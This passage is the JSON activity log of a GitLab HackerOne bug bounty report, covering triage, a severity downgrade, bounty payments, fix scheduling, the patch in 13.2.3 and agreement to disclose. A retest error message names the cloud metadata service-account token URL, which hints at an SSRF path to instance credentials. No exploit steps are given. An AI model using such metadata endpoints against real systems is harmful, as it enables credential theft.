title=\"https://gitlab.com/gitlab-com/gl-infra/infra-report/issues/2\" href=\"/redirect?url=https%3A%2F%2Fgitlab.com%2Fgitlab-com%2Fgl-infra%2Finfra-report%2Fissues%2F2\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://gitlab.com/gitlab-com/gl-infra/infra-report/issues/2\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. This issue will be made public 30 days following the release of a patch.\u003c/p\u003e\n\n\u003cp\u003eHowever due to the impact and limitations of the current vulnerability we have assessed the severity to medium only. Given this severity, we are paying an initial $1000 on triage. Congratulations!\u003c/p\u003e\n\n\u003cp\u003eWe will continue to update you via HackerOne as a patch is scheduled for release.\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nVitor\u003cbr\u003e\nSecurity Team | GitLab Inc.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-03-05T16:37:02.674Z","updated_at":"2020-03-05T16:37:02.674Z","actor":{"username":"vdesousa","cleared":false,"url":"/vdesousa","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7235828,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2020-03-05T16:37:44.480Z","updated_at":"2020-03-05T16:37:44.480Z","additional_data":{"old_severity":"High (8.8)","new_severity":"Medium","old_severity_id":648356,"new_severity_id":650968},"actor":{"username":"vdesousa","cleared":false,"url":"/vdesousa","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7235830,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2020-03-05T16:38:18.623Z","updated_at":"2020-03-05T16:38:18.623Z","actor":{"url":"/gitlab","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"GitLab"}},"bounty_amount":"1000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"gitlab","collaborator":{"username":"lucash-dev","url":"/lucash-dev"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7235989,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, Vitor.\n\nThank you for the triage and bounty. As usual, if I find any new relevant info around this issue I'll add comments here in this report.\n\nthanks!","markdown_message":"\u003cp\u003eHi, Vitor.\u003c/p\u003e\n\n\u003cp\u003eThank you for the triage and bounty. As usual, if I find any new relevant info around this issue I\u0026#39;ll add comments here in this report.\u003c/p\u003e\n\n\u003cp\u003ethanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-03-05T17:04:59.112Z","updated_at":"2020-03-05T17:04:59.112Z","actor":{"username":"lucash-dev","cleared":true,"url":"/lucash-dev","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/515/399/dd4a50c732c98417d7be59efa049e8c234259884_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7273478,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"ETA for fix:\n\nHi @lucash-dev,\n\nThe issue you reported is currently scheduled to be fixed by 2020-06-30.\n\nThank you again for contacting us!\n\nBest regards,\nGitLab Security Team\n","markdown_message":"\u003cp\u003eETA for fix:\u003c/p\u003e\n\n\u003cp\u003eHi \u003ca href=\"/lucash-dev\"\u003e@lucash-dev\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThe issue you reported is currently scheduled to be fixed by 2020-06-30.\u003c/p\u003e\n\n\u003cp\u003eThank you again for contacting us!\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nGitLab Security Team\u003c/p\u003e\n","automated_response":true,"created_at":"2020-03-10T04:06:35.365Z","updated_at":"2020-03-10T04:06:35.365Z","actor":{"username":"gitlab-securitybot","cleared":false,"url":"/gitlab-securitybot","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":7897052,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hi @lucash-dev ,\n\nThank you again for the report! Your finding has been reviewed and we are awarding a bounty prior the release of a patch. Congratulations!\n\nBest regards,\nVitor\nSecurity Team | GitLab Inc.\n","markdown_message":"\u003cp\u003eHi \u003ca href=\"/lucash-dev\"\u003e@lucash-dev\u003c/a\u003e ,\u003c/p\u003e\n\n\u003cp\u003eThank you again for the report! Your finding has been reviewed and we are awarding a bounty prior the release of a patch. Congratulations!\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nVitor\u003cbr\u003e\nSecurity Team | GitLab Inc.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-05T09:50:38.302Z","updated_at":"2020-05-05T09:50:38.302Z","actor":{"url":"/gitlab","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"GitLab"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"500.0","genius_execution_id":null,"team_handle":"gitlab","collaborator":{"username":"lucash-dev","url":"/lucash-dev"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7900659,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, Vitor.\n\nThanks a lot for the bounty! It was a really fun and challenging bug to find, and I'm glad my report is useful to your team. I'm looking forward to seeing it eventually fixed  and disclosing it -- I think it might turn out into an interesting write-up.\n\nAgain, thanks!","markdown_message":"\u003cp\u003eHi, Vitor.\u003c/p\u003e\n\n\u003cp\u003eThanks a lot for the bounty! It was a really fun and challenging bug to find, and I\u0026#39;m glad my report is useful to your team. I\u0026#39;m looking forward to seeing it eventually fixed  and disclosing it -- I think it might turn out into an interesting write-up.\u003c/p\u003e\n\n\u003cp\u003eAgain, thanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-05T15:42:49.887Z","updated_at":"2020-05-05T15:42:49.887Z","actor":{"username":"lucash-dev","cleared":true,"url":"/lucash-dev","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/515/399/dd4a50c732c98417d7be59efa049e8c234259884_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8533032,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi.\n\nI see we are a bit past the expected date for a patch -- please let me know when you manage to fix it. I'd be glad to help re-testing.","markdown_message":"\u003cp\u003eHi.\u003c/p\u003e\n\n\u003cp\u003eI see we are a bit past the expected date for a patch -- please let me know when you manage to fix it. I\u0026#39;d be glad to help re-testing.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-07-08T01:12:28.943Z","updated_at":"2020-07-08T01:12:28.943Z","actor":{"username":"lucash-dev","cleared":true,"url":"/lucash-dev","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/515/399/dd4a50c732c98417d7be59efa049e8c234259884_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8543230,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @lucash-dev,\n\nThanks for asking, I can see there's something blocking the fix at the moment and I'll try to escalate it to get this shipped as soon as possible.\n\nThanks again,\nDominic\nGitLab Security Team","markdown_message":"\u003cp\u003eHi \u003ca href=\"/lucash-dev\"\u003e@lucash-dev\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThanks for asking, I can see there\u0026#39;s something blocking the fix at the moment and I\u0026#39;ll try to escalate it to get this shipped as soon as possible.\u003c/p\u003e\n\n\u003cp\u003eThanks again,\u003cbr\u003e\nDominic\u003cbr\u003e\nGitLab Security Team\u003c/p\u003e\n","automated_response":false,"created_at":"2020-07-08T21:38:20.608Z","updated_at":"2020-07-08T21:38:20.608Z","actor":{"username":"dcouture","cleared":false,"url":"/dcouture","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8655160,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello again @lucash-dev,\n\nThings got moving again and we're expecting to ship this for July's security release around the 28th.\n\nBest regards,\nDominic\nGitLab Security Team","markdown_message":"\u003cp\u003eHello again \u003ca href=\"/lucash-dev\"\u003e@lucash-dev\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThings got moving again and we\u0026#39;re expecting to ship this for July\u0026#39;s security release around the 28th.\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nDominic\u003cbr\u003e\nGitLab Security Team\u003c/p\u003e\n","automated_response":false,"created_at":"2020-07-20T16:11:46.491Z","updated_at":"2020-07-20T16:11:46.491Z","actor":{"username":"dcouture","cleared":false,"url":"/dcouture","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8655796,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"hi @dcouture.\n\nThat's great news. Thanks for keeping me posted!","markdown_message":"\u003cp\u003ehi \u003ca href=\"/dcouture\"\u003e@dcouture\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eThat\u0026#39;s great news. Thanks for keeping me posted!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-07-20T16:48:10.497Z","updated_at":"2020-07-20T16:48:10.497Z","actor":{"username":"lucash-dev","cleared":true,"url":"/lucash-dev","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/515/399/dd4a50c732c98417d7be59efa049e8c234259884_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8659817,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"ETA for fix:\n\nHi @lucash-dev,\n\nThe issue you reported is currently scheduled to be fixed by 2020-08-31.\n\nThank you again for contacting us!\n\nBest regards,\nGitLab Security Team\n","markdown_message":"\u003cp\u003eETA for fix:\u003c/p\u003e\n\n\u003cp\u003eHi \u003ca href=\"/lucash-dev\"\u003e@lucash-dev\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThe issue you reported is currently scheduled to be fixed by 2020-08-31.\u003c/p\u003e\n\n\u003cp\u003eThank you again for contacting us!\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nGitLab Security Team\u003c/p\u003e\n","automated_response":true,"created_at":"2020-07-21T04:21:19.518Z","updated_at":"2020-07-21T04:21:19.518Z","actor":{"username":"gitlab-securitybot","cleared":false,"url":"/gitlab-securitybot","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8770287,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @lucash-dev,\n\nIn my previous message I mentioned that our security release would be around the 28th, but exceptionally for this release the delivery team is testing new processes and the release will happen a week later than normal. I wanted to keep you updated since I had given you a precise date.\n\nThanks for your patience,\nDominic\nGitLab Security Team","markdown_message":"\u003cp\u003eHi \u003ca href=\"/lucash-dev\"\u003e@lucash-dev\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eIn my previous message I mentioned that our security release would be around the 28th, but exceptionally for this release the delivery team is testing new processes and the release will happen a week later than normal. I wanted to keep you updated since I had given you a precise date.\u003c/p\u003e\n\n\u003cp\u003eThanks for your patience,\u003cbr\u003e\nDominic\u003cbr\u003e\nGitLab Security Team\u003c/p\u003e\n","automated_response":false,"created_at":"2020-07-27T17:57:49.567Z","updated_at":"2020-07-27T17:57:49.567Z","actor":{"username":"dcouture","cleared":false,"url":"/dcouture","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8770710,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"ok. thanks for the update!","markdown_message":"\u003cp\u003eok. thanks for the update!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-07-27T18:36:18.146Z","updated_at":"2020-07-27T18:36:18.146Z","actor":{"username":"lucash-dev","cleared":true,"url":"/lucash-dev","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/515/399/dd4a50c732c98417d7be59efa049e8c234259884_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8866594,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @lucash-dev ,\n\nThank you again for the report! Your finding has been patched in GitLab version 13.2.3. Congratulations!\n\nPlease let us know if you find that our patch does not mitigate your finding. Your report will be published in 30 days in GitLab's issue tracker.\n\nWe look forward to your next report!\n\nBest regards,\nVitor\nGitLab Security Team","markdown_message":"\u003cp\u003eHi \u003ca href=\"/lucash-dev\"\u003e@lucash-dev\u003c/a\u003e ,\u003c/p\u003e\n\n\u003cp\u003eThank you again for the report! Your finding has been patched in GitLab version 13.2.3. Congratulations!\u003c/p\u003e\n\n\u003cp\u003ePlease let us know if you find that our patch does not mitigate your finding. Your report will be published in 30 days in GitLab\u0026#39;s issue tracker.\u003c/p\u003e\n\n\u003cp\u003eWe look forward to your next report!\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nVitor\u003cbr\u003e\nGitLab Security Team\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-06T15:20:38.095Z","updated_at":"2020-08-06T15:20:38.095Z","actor":{"username":"vdesousa","cleared":false,"url":"/vdesousa","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"lucash-dev","url":"/lucash-dev"},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8868097,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks, Vitor!\nI will test on my end and report back.\n","markdown_message":"\u003cp\u003eThanks, Vitor!\u003cbr\u003e\nI will test on my end and report back.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-06T17:40:12.041Z","updated_at":"2020-08-06T17:40:12.041Z","actor":{"username":"lucash-dev","cleared":true,"url":"/lucash-dev","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/515/399/dd4a50c732c98417d7be59efa049e8c234259884_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8898033,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Hi, @vdesousa.\n\nI re-tested and wasn't able to reproduce anymore. Got the following error message instead:\n\n```\nERROR: Job failed (system failure): error during connect: Post http://metadata.google.internal:80/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=text: redirects disallowed\n```\n\nCan we disclose, since it is already patched?\n\nThank you!","markdown_message":"\u003cp\u003eHi, \u003ca href=\"/vdesousa\"\u003e@vdesousa\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eI re-tested and wasn\u0026#39;t able to reproduce anymore. Got the following error message instead:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eERROR: Job failed (system failure): error during connect: Post http://metadata.google.internal:80/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=text: redirects disallowed\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eCan we disclose, since it is already patched?\u003c/p\u003e\n\n\u003cp\u003eThank you!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-10T20:12:45.233Z","updated_at":"2020-08-10T20:12:45.233Z","first_to_agree":true,"actor":{"username":"lucash-dev","cleared":true,"url":"/lucash-dev","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/515/399/dd4a50c732c98417d7be59efa049e8c234259884_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8957985,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @lucash-dev,\n\nWe'll be glad to disclose this report around 30 days after resolution.\n\nThanks,\nDominic\nGitLab Security Team","markdown_message":"\u003cp\u003eHi \u003ca href=\"/lucash-dev\"\u003e@lucash-dev\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eWe\u0026#39;ll be glad to disclose this report around 30 days after resolution.\u003c/p\u003e\n\n\u003cp\u003eThanks,\u003cbr\u003e\nDominic\u003cbr\u003e\nGitLab Security Team\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-17T13:42:00.085Z","updated_at":"2020-08-17T13:42:00.085Z","actor":{"username":"dcouture","cleared":false,"url":"/dcouture","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8973007,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks, Dominic!","markdown_message":"\u003cp\u003eThanks, Dominic!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-18T21:59:56.490Z","updated_at":"2020-08-18T21:59:56.490Z","actor":{"username":"lucash-dev","cleared":true,"url":"/lucash-dev","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/515/399/dd4a50c732c98417d7be59efa049e8c234259884_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9160218,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-09-08T13:28:39.411Z","updated_at":"2020-09-08T13:28:39.411Z","actor":{"username":"dcouture","cleared":false,"url":"/dcouture","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9160219,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-09-08T13:28:39.561Z","updated_at":"2020-09-08T13:28:39.561Z","actor":{"username":"dcouture","cleared":false,"url":"/dcouture","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}